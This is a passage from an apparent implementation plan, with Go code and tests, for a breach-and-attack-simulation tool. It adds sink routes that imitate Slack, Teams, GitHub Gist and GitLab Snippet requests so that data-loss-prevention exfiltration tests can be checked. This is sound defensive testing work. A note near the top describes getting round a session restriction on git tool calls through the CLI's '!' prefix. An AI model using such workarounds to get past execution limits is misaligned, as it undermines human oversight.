# Webhook / Code-Repository Exfiltration Channel Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add the seventh DLP exfiltration channel — four HTTP routes on the orchestrator's existing API server mimicking Slack/MS Teams incoming-webhook requests and GitHub/GitLab Gist/Snippet-creation API requests, each writing a destination-side receipt when a request's embedded token matches a live run.

**Architecture:** A new isolated package `internal/webhooksink` exposes a `chi.Router` mounted under `/webhooksink` on the orchestrator's already-running HTTPS API server — no new listener, no new port, no new capability grant, mirroring `internal/cloudsink` exactly. Two genuinely different request families map to two different MITRE techniques: Slack/Teams (no auth header, token in the JSON message body) under T1567.004; GitHub/GitLab (a real-shaped but unvalidated auth header, token in the Gist/Snippet filename) under T1567.001. Two scenarios drive four `Invoke-RestMethod` calls — always present, no client-tool-absence branch needed.

**Tech Stack:** Go, `net/http`/`chi` (already in this codebase), `encoding/json` (stdlib), PostgreSQL (`dlp_sink_tokens`/`dlp_sink_receipts`, already exist), PowerShell (`Invoke-RestMethod`).

**Spec:** `orchestrator/docs/superpowers/specs/2026-09-01-webhook-exfiltration-channel-design.md`

## Global Constraints

- Two MITRE techniques: **T1567.004 — Exfiltration Over Webhook** (Slack, MS Teams) and **T1567.001 — Exfiltration to Code Repository** (GitHub, GitLab) — confirmed against `orchestrator/internal/reporting/attackdata/attack_enrichment.json`.
- No new listener, no new port, no new config-flag surface — routes mount on the existing API server, same as cloud storage.
- Per-request byte ceiling: **64KB** (`MaxPayloadBytes` in `internal/webhooksink`), enforced via `http.MaxBytesReader` before any buffering.
- Every route validates the extracted token against `dlp_sink_tokens` (exact match) BEFORE writing a receipt — an unmatched token still returns a plausible success-shaped response, never a scary failure, and writes no receipt.
- One shared `rateLimiter` instance for the whole package (all four routes together), not one per route.
- `channel` column values are exactly: `webhook-slack`, `webhook-teams`, `coderepo-github`, `coderepo-gitlab`.
- Auth-header fidelity differs by provider and is NOT validated by any handler: Slack/Teams carry no auth header at all; GitHub carries `Authorization: token <any-value>`; GitLab carries `PRIVATE-TOKEN: <any-value>`. No handler checks these header values — presence/absence fidelity only.
- Reuse the existing 32-byte/64-hex `{{SINK_TOKEN}}` unchanged — no new token byte-length variant.
- Never log or persist raw request/response body content — only token, size, and SHA-256 hash.
- Commit and push after every task — this repo builds directly on `main`, no feature branches/worktrees/PRs.

**Note on `git`:** this session has a confirmed, reproducible issue where `git` commands specifically are refused when run as a tool call (unrelated to git itself — a session-level execution restriction). Every task's commit step is still written out in full; if blocked, run it manually (or via the CLI's `!` prefix) exactly as written.

---

## Task 1: `internal/webhooksink` core — rate limiter, byte ceiling, receipt writer, router skeleton

**Files:**
- Create: `orchestrator/internal/webhooksink/webhooksink.go`
- Create: `orchestrator/internal/webhooksink/webhooksink_test.go`

**Interfaces:**
- Produces: `const MaxPayloadBytes = 64 * 1024`; `type rateLimiter struct{...}` with `newRateLimiter(limit int, window time.Duration) *rateLimiter` and `(rl *rateLimiter) allow(sourceIP string) bool` (identical shape to `internal/cloudsink`'s own, duplicated not shared); `func tokenExists(ctx context.Context, db *pgxpool.Pool, token string) bool`; `func writeReceipt(ctx context.Context, db *pgxpool.Pool, token, sourceIP, channel string, body []byte) error`; `func Routes(db *pgxpool.Pool) chi.Router` (empty router in this task — routes added in later tasks).
- Produces (test-only, used by Tasks 2-3's provider test files): `sharedDB`, `TestMain`, `seedToken(t, pool, token, runID, techniqueID)`, `assertReceiptRecorded(t, pool, token, wantChannel, wantSize)`, `assertNoReceipt(t, pool, token)`, `slackTeamsBody(t, text) []byte` — all in `webhooksink_test.go`, mirroring `internal/cloudsink/cloudsink_test.go`'s own layout.

- [ ] **Step 1: Write the failing tests**

`internal/cloudsink/cloudsink_test.go` keeps `sharedDB`, `TestMain`, and
every shared assert helper in the package's own root test file rather
than scattering them across provider test files — mirror that exactly
here, so Tasks 2-3's provider test files contain nothing but their own
provider's tests.

```go
package webhooksink

import (
	"context"
	"encoding/json"
	"flag"
	"os"
	"testing"
	"time"

	"github.com/audspect/bas/internal/testutil"
	"github.com/jackc/pgx/v5/pgxpool"
)

var sharedDB *testutil.TestDB

func TestMain(m *testing.M) {
	flag.Parse()
	if testing.Short() {
		os.Exit(m.Run())
	}
	sharedDB = testutil.MustSharedTestDB()
	code := m.Run()
	sharedDB.Cleanup()
	os.Exit(code)
}

// seedToken inserts a dlp_sink_tokens row directly, matching
// issueSinkTokensAndSubstitute's own insert shape.
func seedToken(t *testing.T, pool *pgxpool.Pool, token, runID, techniqueID string) {
	t.Helper()
	if _, err := pool.Exec(context.Background(),
		`INSERT INTO dlp_sink_tokens (token, run_id, technique_id, expires_at) VALUES ($1, $2, $3, $4)`,
		token, runID, techniqueID, time.Now().Add(10*time.Minute),
	); err != nil {
		t.Fatalf("seed dlp_sink_tokens: %v", err)
	}
}

// assertReceiptRecorded polls for up to 5s since the HTTP response may
// return before the write is visible to a separate connection.
func assertReceiptRecorded(t *testing.T, pool *pgxpool.Pool, token, wantChannel string, wantSize int) {
	t.Helper()
	var channel string
	var size int
	deadline := time.Now().Add(5 * time.Second)
	for {
		err := pool.QueryRow(context.Background(),
			`SELECT channel, payload_size FROM dlp_sink_receipts WHERE token = $1`, token,
		).Scan(&channel, &size)
		if err == nil {
			break
		}
		if time.Now().After(deadline) {
			t.Fatalf("no dlp_sink_receipts row for token within 5s: %v", err)
		}
		time.Sleep(50 * time.Millisecond)
	}
	if channel != wantChannel {
		t.Errorf("channel = %q, want %q", channel, wantChannel)
	}
	if size != wantSize {
		t.Errorf("payload_size = %d, want %d", size, wantSize)
	}
}

func assertNoReceipt(t *testing.T, pool *pgxpool.Pool, token string) {
	t.Helper()
	time.Sleep(200 * time.Millisecond) // let any (incorrect) write land before checking
	var count int
	if err := pool.QueryRow(context.Background(),
		`SELECT count(*) FROM dlp_sink_receipts WHERE token = $1`, token,
	).Scan(&count); err != nil {
		t.Fatalf("count receipts: %v", err)
	}
	if count != 0 {
		t.Errorf("dlp_sink_receipts rows for unmatched token = %d, want 0", count)
	}
}

// slackTeamsBody builds the {"text": "..."} JSON body Slack and MS Teams
// incoming webhooks both use.
func slackTeamsBody(t *testing.T, text string) []byte {
	t.Helper()
	b, err := json.Marshal(map[string]string{"text": text})
	if err != nil {
		t.Fatalf("marshal body: %v", err)
	}
	return b
}

func TestRateLimiter_AllowsUpToLimitPerWindow(t *testing.T) {
	rl := newRateLimiter(3, time.Minute)
	for i := 0; i < 3; i++ {
		if !rl.allow("10.0.0.1") {
			t.Fatalf("request %d should be allowed within the limit", i)
		}
	}
	if rl.allow("10.0.0.1") {
		t.Error("4th request in the same window should be rejected")
	}
}

func TestRateLimiter_TracksSourcesIndependently(t *testing.T) {
	rl := newRateLimiter(1, time.Minute)
	if !rl.allow("10.0.0.1") {
		t.Fatal("first request from 10.0.0.1 should be allowed")
	}
	if !rl.allow("10.0.0.2") {
		t.Error("a different source IP must have its own independent limit")
	}
}

func TestTokenExists_FalseForNilDB(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if tokenExists(ctx, nil, "any-token") {
		t.Error("tokenExists must not panic or return true when db is nil / ctx is cancelled")
	}
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd orchestrator && go test ./internal/webhooksink/... -run . -v 2>&1 | head -40`
Expected: FAIL — package `webhooksink` does not exist yet.

- [ ] **Step 3: Write the implementation**

```go
// Package webhooksink implements HTTP routes that mimic Slack/MS Teams
// incoming-webhook requests and GitHub/GitLab Gist/Snippet-creation API
// requests for the DLP validation suite. Two genuinely different request
// families, mapping to two different MITRE techniques -- see
// docs/superpowers/specs/2026-09-01-webhook-exfiltration-channel-design.md.
// Like internal/cloudsink, these are all HTTPS routes mounted on the
// orchestrator's existing API server rather than a separate listener.
package webhooksink

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"sync"
	"time"

	"github.com/go-chi/chi/v5"
	"github.com/jackc/pgx/v5/pgxpool"
)

// MaxPayloadBytes bounds the total bytes any of the four routes will
// buffer for a single request body. Matches every sibling channel's own
// ceiling, for consistency across this program.
const MaxPayloadBytes = 64 * 1024

// rateLimiter is a coarse, fixed-window per-source-IP abuse guard -- one
// instance shared across all four routes (they are four doors into the
// same abuse surface, not four independent ones), identical in shape to
// internal/cloudsink's own, duplicated here rather than shared because
// that type is unexported in that sibling package.
type rateLimiter struct {
	mu     sync.Mutex
	limit  int
	window time.Duration
	counts map[string]*windowCount
}

type windowCount struct {
	count      int
	windowEnds time.Time
}

func newRateLimiter(limit int, window time.Duration) *rateLimiter {
	return &rateLimiter{limit: limit, window: window, counts: map[string]*windowCount{}}
}

// allow reports whether sourceIP may make another request in the current
// window, incrementing its count as a side effect.
func (rl *rateLimiter) allow(sourceIP string) bool {
	rl.mu.Lock()
	defer rl.mu.Unlock()
	now := time.Now()
	wc, ok := rl.counts[sourceIP]
	if !ok || now.After(wc.windowEnds) {
		rl.counts[sourceIP] = &windowCount{count: 1, windowEnds: now.Add(rl.window)}
		return true
	}
	wc.count++
	return wc.count <= rl.limit
}

// rateLimitPerSecond matches every sibling channel's identical rationale:
// this surface only ever expects traffic from BAS agents running a
// scenario step.
const rateLimitPerSecond = 5

var limiter = newRateLimiter(rateLimitPerSecond, time.Second)

// tokenExists reports whether token has a live row in dlp_sink_tokens.
// Returns false (never panics) for a nil db or an errored query -- every
// handler treats "false" identically to "not matched": still return a
// plausible success response, just never write a receipt.
func tokenExists(ctx context.Context, db *pgxpool.Pool, token string) bool {
	if db == nil || token == "" {
		return false
	}
	var exists bool
	if err := db.QueryRow(ctx,
		`SELECT EXISTS(SELECT 1 FROM dlp_sink_tokens WHERE token = $1)`, token,
	).Scan(&exists); err != nil {
		return false
	}
	return exists
}

// writeReceipt hashes body (SHA-256, raw content never persisted -- same
// rule every channel in this program follows) and writes one
// dlp_sink_receipts row for the given channel. Callers must have already
// confirmed the token exists via tokenExists.
func writeReceipt(ctx context.Context, db *pgxpool.Pool, token, sourceIP, channel string, body []byte) error {
	sum := sha256.Sum256(body)
	_, err := db.Exec(ctx,
		`INSERT INTO dlp_sink_receipts (token, source_ip, payload_hash, payload_size, channel)
		 VALUES ($1, $2, $3, $4, $5)`,
		token, sourceIP, hex.EncodeToString(sum[:]), len(body), channel,
	)
	return err
}

// Routes returns the chi.Router mounted at /webhooksink by
// internal/api/routes.go. Individual provider routes are registered in
// Tasks 2-3 of this plan.
func Routes(db *pgxpool.Pool) chi.Router {
	r := chi.NewRouter()
	return r
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd orchestrator && go test ./internal/webhooksink/... -v`
Expected: PASS for all 3 tests.

- [ ] **Step 5: gofmt and commit**

```bash
cd orchestrator
gofmt -l internal/webhooksink/webhooksink.go internal/webhooksink/webhooksink_test.go
git add internal/webhooksink/webhooksink.go internal/webhooksink/webhooksink_test.go
git commit -m "feat(webhooksink): add rate limiter, receipt writer, and router skeleton"
git push
```

---

## Task 2: Slack and MS Teams handlers — no-auth webhook shape, token in message text

**Files:**
- Create: `orchestrator/internal/webhooksink/slack.go`
- Create: `orchestrator/internal/webhooksink/teams.go`
- Create: `orchestrator/internal/webhooksink/slack_test.go`
- Create: `orchestrator/internal/webhooksink/teams_test.go`
- Modify: `orchestrator/internal/webhooksink/webhooksink.go` (register both routes in `Routes` — this file's test file needs no changes; all shared test scaffolding already landed in Task 1)

**Interfaces:**
- Consumes: `MaxPayloadBytes`, `tokenExists`, `writeReceipt`, `limiter` (Task 1).
- Produces: `func handleSlackWebhook(db *pgxpool.Pool) http.HandlerFunc`, `func handleTeamsWebhook(db *pgxpool.Pool) http.HandlerFunc`.

Both providers' real incoming webhooks carry no separate auth header (the
URL itself is the secret) and a JSON body `{"text": "..."}`. The token is
the first line of `text`; the rest is the synthetic record.

- [ ] **Step 1: Write the failing tests**

```go
// slack_test.go
package webhooksink

import (
	"bytes"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/jackc/pgx/v5/pgxpool"
)

func TestSlackWebhook_MatchedTokenRecordsReceipt(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		token := "a1b2c3d4e5f60718a1b2c3d4e5f60718a1b2c3d4e5f60718a1b2c3d4e5f60718"
		seedToken(t, pool, token, "run-slack-1", "T1567.004")

		srv := httptest.NewServer(Routes(pool))
		defer srv.Close()

		text := token + "\n[BAS-SIM-DLP] test payload"
		body := slackTeamsBody(t, text)
		req, _ := http.NewRequest(http.MethodPost, srv.URL+"/slack/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX", bytes.NewReader(body))
		req.Header.Set("Content-Type", "application/json")
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatalf("POST: %v", err)
		}
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			t.Errorf("status = %d, want 200", resp.StatusCode)
		}
		assertReceiptRecorded(t, pool, token, "webhook-slack", len(body))
	})
}

func TestSlackWebhook_UnmatchedTokenStillSucceedsNoReceipt(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		srv := httptest.NewServer(Routes(pool))
		defer srv.Close()

		body := slackTeamsBody(t, "never-issued-token\nunrelated body")
		req, _ := http.NewRequest(http.MethodPost, srv.URL+"/slack/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX", bytes.NewReader(body))
		req.Header.Set("Content-Type", "application/json")
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatalf("POST: %v", err)
		}
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			t.Errorf("status = %d, want 200 even for an unmatched token", resp.StatusCode)
		}
		assertNoReceipt(t, pool, "never-issued-token")
	})
}

func TestSlackWebhook_OversizedBodyRejected(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		srv := httptest.NewServer(Routes(pool))
		defer srv.Close()

		tooBig := slackTeamsBody(t, string(bytes.Repeat([]byte("x"), MaxPayloadBytes+1024)))
		req, _ := http.NewRequest(http.MethodPost, srv.URL+"/slack/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX", bytes.NewReader(tooBig))
		req.Header.Set("Content-Type", "application/json")
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatalf("POST: %v", err)
		}
		defer resp.Body.Close()
		if resp.StatusCode == http.StatusOK {
			t.Error("a body exceeding MaxPayloadBytes should not return 200")
		}
	})
}
```

```go
// teams_test.go
package webhooksink

import (
	"bytes"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/jackc/pgx/v5/pgxpool"
)

func TestTeamsWebhook_MatchedTokenRecordsReceipt(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		token := "b2c3d4e5f60718a1b2c3d4e5f60718a1b2c3d4e5f60718a1b2c3d4e5f60718a1"
		seedToken(t, pool, token, "run-teams-1", "T1567.004")

		srv := httptest.NewServer(Routes(pool))
		defer srv.Close()

		text := token + "\n[BAS-SIM-DLP] test payload"
		body := slackTeamsBody(t, text)
		uri := srv.URL + "/teams/webhookb2/00000000-0000-0000-0000-000000000000/IncomingWebhook/11111111111111111111111111111111/22222222-2222-2222-2222-222222222222"
		req, _ := http.NewRequest(http.MethodPost, uri, bytes.NewReader(body))
		req.Header.Set("Content-Type", "application/json")
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatalf("POST: %v", err)
		}
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			t.Errorf("status = %d, want 200", resp.StatusCode)
		}
		assertReceiptRecorded(t, pool, token, "webhook-teams", len(body))
	})
}
```

All shared scaffolding (`sharedDB`, `TestMain`, `seedToken`,
`assertReceiptRecorded`, `assertNoReceipt`, `slackTeamsBody`) already
exists in `webhooksink_test.go` from Task 1 — do not redeclare any of it
in these provider test files.

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd orchestrator && go test ./internal/webhooksink/... -run "Slack|Teams" -v 2>&1 | head -40`
Expected: FAIL — handlers undefined, routes not registered (404s).

- [ ] **Step 3: Write the implementation**

```go
// slack.go
package webhooksink

import (
	"encoding/json"
	"io"
	"net"
	"net/http"
	"strings"

	"github.com/jackc/pgx/v5/pgxpool"
)

// handleSlackWebhook mimics a Slack Incoming Webhook request: JSON body
// {"text": "..."}, no separate auth header (the webhook URL itself is the
// secret in real Slack, matching this route's own path shape). The token
// is the first line of "text"; the rest is the synthetic record.
func handleSlackWebhook(db *pgxpool.Pool) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		host, _, err := net.SplitHostPort(r.RemoteAddr)
		if err != nil {
			host = r.RemoteAddr
		}
		if !limiter.allow(host) {
			w.WriteHeader(http.StatusTooManyRequests)
			return
		}

		r.Body = http.MaxBytesReader(w, r.Body, MaxPayloadBytes)
		body, err := io.ReadAll(r.Body)
		if err != nil {
			http.Error(w, "request entity too large", http.StatusRequestEntityTooLarge)
			return
		}

		var payload struct {
			Text string `json:"text"`
		}
		token := ""
		if json.Unmarshal(body, &payload) == nil {
			token = strings.SplitN(payload.Text, "\n", 2)[0]
		}

		if token != "" && tokenExists(r.Context(), db, token) {
			_ = writeReceipt(r.Context(), db, token, host, "webhook-slack", body)
		}
		w.Header().Set("Content-Type", "text/plain")
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("ok"))
	}
}
```

```go
// teams.go
package webhooksink

import (
	"encoding/json"
	"io"
	"net"
	"net/http"
	"strings"

	"github.com/jackc/pgx/v5/pgxpool"
)

// handleTeamsWebhook mimics a Microsoft Teams Incoming Webhook request:
// same JSON body shape and no-auth-header posture as Slack's, different
// path structure. The token is the first line of "text".
func handleTeamsWebhook(db *pgxpool.Pool) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		host, _, err := net.SplitHostPort(r.RemoteAddr)
		if err != nil {
			host = r.RemoteAddr
		}
		if !limiter.allow(host) {
			w.WriteHeader(http.StatusTooManyRequests)
			return
		}

		r.Body = http.MaxBytesReader(w, r.Body, MaxPayloadBytes)
		body, err := io.ReadAll(r.Body)
		if err != nil {
			http.Error(w, "request entity too large", http.StatusRequestEntityTooLarge)
			return
		}

		var payload struct {
			Text string `json:"text"`
		}
		token := ""
		if json.Unmarshal(body, &payload) == nil {
			token = strings.SplitN(payload.Text, "\n", 2)[0]
		}

		if token != "" && tokenExists(r.Context(), db, token) {
			_ = writeReceipt(r.Context(), db, token, host, "webhook-teams", body)
		}
		w.Header().Set("Content-Type", "text/plain")
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("1"))
	}
}
```

Update `Routes` in `webhooksink.go`:

```go
func Routes(db *pgxpool.Pool) chi.Router {
	r := chi.NewRouter()
	r.Post("/slack/services/{a}/{b}/{c}", handleSlackWebhook(db))
	r.Post("/teams/webhookb2/{guid1}/IncomingWebhook/{guid2}/{guid3}", handleTeamsWebhook(db))
	return r
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd orchestrator && go test ./internal/webhooksink/... -v`
Expected: PASS for all tests (Task 1's 3 plus Task 2's 4).

- [ ] **Step 5: gofmt and commit**

```bash
cd orchestrator
gofmt -l internal/webhooksink/*.go
git add internal/webhooksink/slack.go internal/webhooksink/teams.go internal/webhooksink/slack_test.go internal/webhooksink/teams_test.go internal/webhooksink/webhooksink.go
git commit -m "feat(webhooksink): add Slack and MS Teams incoming-webhook handlers"
git push
```

---

## Task 3: GitHub and GitLab handlers — real-shaped auth header, token in filename

**Files:**
- Create: `orchestrator/internal/webhooksink/github.go`
- Create: `orchestrator/internal/webhooksink/gitlab.go`
- Create: `orchestrator/internal/webhooksink/github_test.go`
- Create: `orchestrator/internal/webhooksink/gitlab_test.go`
- Modify: `orchestrator/internal/webhooksink/webhooksink.go` (register both routes)

**Interfaces:**
- Consumes: same as Task 2.
- Produces: `func handleGitHubGist(db *pgxpool.Pool) http.HandlerFunc`, `func handleGitLabSnippet(db *pgxpool.Pool) http.HandlerFunc`.

Both providers' real Gist/Snippet-creation APIs require an auth header —
`Authorization: token <PAT>` for GitHub, `PRIVATE-TOKEN: <token>` for
GitLab. Neither handler validates the header's *value* (presence-of-header
fidelity only, no real signing/auth, matching every prior channel's
"no real signing" bar) — only that a request with the right body shape
arrived.

- [ ] **Step 1: Write the failing tests**

```go
// github_test.go
package webhooksink

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/jackc/pgx/v5/pgxpool"
)

func TestGitHubGist_MatchedTokenRecordsReceipt(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		token := "c3d4e5f60718a1b2c3d4e5f60718a1b2c3d4e5f60718a1b2c3d4e5f60718a1b2"
		seedToken(t, pool, token, "run-github-1", "T1567.001")

		srv := httptest.NewServer(Routes(pool))
		defer srv.Close()

		content := "[BAS-SIM-DLP] test payload"
		payload := map[string]any{
			"description": "bas-sim",
			"public":      false,
			"files": map[string]any{
				token + ".dat": map[string]string{"content": content},
			},
		}
		body, _ := json.Marshal(payload)
		req, _ := http.NewRequest(http.MethodPost, srv.URL+"/github/gists", bytes.NewReader(body))
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("Authorization", "token bas-sim-fake-pat-0000000000000000")
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatalf("POST: %v", err)
		}
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusCreated {
			t.Errorf("status = %d, want 201 (matching real GitHub Gist creation's own success code)", resp.StatusCode)
		}
		assertReceiptRecorded(t, pool, token, "coderepo-github", len(body))
	})
}

func TestGitHubGist_UnmatchedTokenStillSucceedsNoReceipt(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		srv := httptest.NewServer(Routes(pool))
		defer srv.Close()

		payload := map[string]any{
			"description": "bas-sim",
			"public":      false,
			"files":       map[string]any{"never-issued.dat": map[string]string{"content": "x"}},
		}
		body, _ := json.Marshal(payload)
		req, _ := http.NewRequest(http.MethodPost, srv.URL+"/github/gists", bytes.NewReader(body))
		req.Header.Set("Authorization", "token bas-sim-fake-pat-0000000000000000")
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatalf("POST: %v", err)
		}
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusCreated {
			t.Errorf("status = %d, want 201 even for an unmatched token", resp.StatusCode)
		}
		assertNoReceipt(t, pool, "never-issued")
	})
}
```

```go
// gitlab_test.go
package webhooksink

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/jackc/pgx/v5/pgxpool"
)

func TestGitLabSnippet_MatchedTokenRecordsReceipt(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		token := "d4e5f60718a1b2c3d4e5f60718a1b2c3d4e5f60718a1b2c3d4e5f60718a1b2c3"
		seedToken(t, pool, token, "run-gitlab-1", "T1567.001")

		srv := httptest.NewServer(Routes(pool))
		defer srv.Close()

		payload := map[string]any{
			"title":      "bas-sim",
			"visibility": "private",
			"file_name":  token + ".dat",
			"content":    "[BAS-SIM-DLP] test payload",
		}
		body, _ := json.Marshal(payload)
		req, _ := http.NewRequest(http.MethodPost, srv.URL+"/gitlab/api/v4/snippets", bytes.NewReader(body))
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("PRIVATE-TOKEN", "bas-sim-fake-token-0000000000000000")
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatalf("POST: %v", err)
		}
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusCreated {
			t.Errorf("status = %d, want 201 (matching real GitLab Snippet creation's own success code)", resp.StatusCode)
		}
		assertReceiptRecorded(t, pool, token, "coderepo-gitlab", len(body))
	})
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd orchestrator && go test ./internal/webhooksink/... -run "GitHub|GitLab" -v 2>&1 | head -40`
Expected: FAIL — handlers undefined, routes not registered.

- [ ] **Step 3: Write the implementation**

```go
// github.go
package webhooksink

import (
	"encoding/json"
	"io"
	"net"
	"net/http"
	"strings"

	"github.com/jackc/pgx/v5/pgxpool"
)

// handleGitHubGist mimics GitHub's POST /gists request: a "files" map
// keyed by filename, whose sole key carries the token. The Authorization
// header's value is never validated -- presence fidelity only.
func handleGitHubGist(db *pgxpool.Pool) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		host, _, err := net.SplitHostPort(r.RemoteAddr)
		if err != nil {
			host = r.RemoteAddr
		}
		if !limiter.allow(host) {
			w.WriteHeader(http.StatusTooManyRequests)
			return
		}

		r.Body = http.MaxBytesReader(w, r.Body, MaxPayloadBytes)
		body, err := io.ReadAll(r.Body)
		if err != nil {
			http.Error(w, "request entity too large", http.StatusRequestEntityTooLarge)
			return
		}

		var payload struct {
			Files map[string]struct {
				Content string `json:"content"`
			} `json:"files"`
		}
		token := ""
		if json.Unmarshal(body, &payload) == nil {
			for filename := range payload.Files {
				token = strings.TrimSuffix(filename, ".dat")
				break
			}
		}

		if token != "" && tokenExists(r.Context(), db, token) {
			_ = writeReceipt(r.Context(), db, token, host, "coderepo-github", body)
		}
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		_, _ = w.Write([]byte(`{"id":"bas-sim-gist-id","html_url":"https://gist.github.com/bas-sim"}`))
	}
}
```

```go
// gitlab.go
package webhooksink

import (
	"encoding/json"
	"io"
	"net"
	"net/http"
	"strings"

	"github.com/jackc/pgx/v5/pgxpool"
)

// handleGitLabSnippet mimics GitLab's POST /api/v4/snippets request: a
// "file_name" field carries the token. The PRIVATE-TOKEN header's value
// is never validated -- presence fidelity only.
func handleGitLabSnippet(db *pgxpool.Pool) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		host, _, err := net.SplitHostPort(r.RemoteAddr)
		if err != nil {
			host = r.RemoteAddr
		}
		if !limiter.allow(host) {
			w.WriteHeader(http.StatusTooManyRequests)
			return
		}

		r.Body = http.MaxBytesReader(w, r.Body, MaxPayloadBytes)
		body, err := io.ReadAll(r.Body)
		if err != nil {
			http.Error(w, "request entity too large", http.StatusRequestEntityTooLarge)
			return
		}

		var payload struct {
			FileName string `json:"file_name"`
		}
		token := ""
		if json.Unmarshal(body, &payload) == nil {
			token = strings.TrimSuffix(payload.FileName, ".dat")
		}

		if token != "" && tokenExists(r.Context(), db, token) {
			_ = writeReceipt(r.Context(), db, token, host, "coderepo-gitlab", body)
		}
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		_, _ = w.Write([]byte(`{"id":1,"web_url":"https://gitlab.example/-/snippets/bas-sim"}`))
	}
}
```

Update `Routes` in `webhooksink.go`:

```go
	r.Post("/github/gists", handleGitHubGist(db))
	r.Post("/gitlab/api/v4/snippets", handleGitLabSnippet(db))
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd orchestrator && go test ./internal/webhooksink/... -v`
Expected: PASS for all tests across all four providers (Tasks 1-3 combined).

- [ ] **Step 5: gofmt and commit**

```bash
cd orchestrator
gofmt -l internal/webhooksink/*.go
git add internal/webhooksink/github.go internal/webhooksink/gitlab.go internal/webhooksink/github_test.go internal/webhooksink/gitlab_test.go internal/webhooksink/webhooksink.go
git commit -m "feat(webhooksink): add GitHub Gist and GitLab Snippet handlers"
git push
```

---

## Task 4: Mount `/webhooksink` and register routes in the RBAC drift allowlist

**Files:**
- Modify: `orchestrator/internal/api/routes.go:1-13` (imports), `:161` (mount point)
- Modify: `orchestrator/internal/api/rbac_matrix_test.go:424-435` (publicRoutes)

**Interfaces:**
- Consumes: `webhooksink.Routes(db *pgxpool.Pool) chi.Router` (Tasks 1-3).

This task folds the RBAC-allowlist registration into the same task that
adds the routes — cloud storage's implementation caught a real regression
(`TestRBACMatrix_NoDrift` failing because routes were registered but not
added to `publicRoutes`, fixed in commit `24a83e6`) specifically because
that step was left for later. Do not repeat that mistake here.

- [ ] **Step 1: Add the import**

In `orchestrator/internal/api/routes.go`, add to the import block (alphabetically after `ws`, or wherever gofmt/goimports would place it — this repo's imports are alphabetized within their block):

```go
	"github.com/audspect/bas/internal/webhooksink"
```

- [ ] **Step 2: Mount the routes**

Immediately after the existing `r.Mount("/cloudsink", cloudsink.Routes(h.db))` line:

```go
	// Webhook / code-repository exfiltration channel (internal/webhooksink)
	// -- Slack/Teams incoming-webhook shape (T1567.004) and GitHub/GitLab
	// Gist/Snippet-API shape (T1567.001). Same unauthenticated posture as
	// /api/dlp/sink and /cloudsink immediately above.
	r.Mount("/webhooksink", webhooksink.Routes(h.db))
```

- [ ] **Step 3: Add all four routes to the RBAC drift allowlist**

In `orchestrator/internal/api/rbac_matrix_test.go`, immediately after the existing cloud storage block in `publicRoutes` (after the `"POST /cloudsink/box/2.0/files/content": true,` line):

```go
	// Webhook / code-repository exfiltration channel (internal/webhooksink)
	// -- same unauthenticated posture as /cloudsink immediately above.
	"POST /webhooksink/slack/services/{a}/{b}/{c}":                                     true,
	"POST /webhooksink/teams/webhookb2/{guid1}/IncomingWebhook/{guid2}/{guid3}":         true,
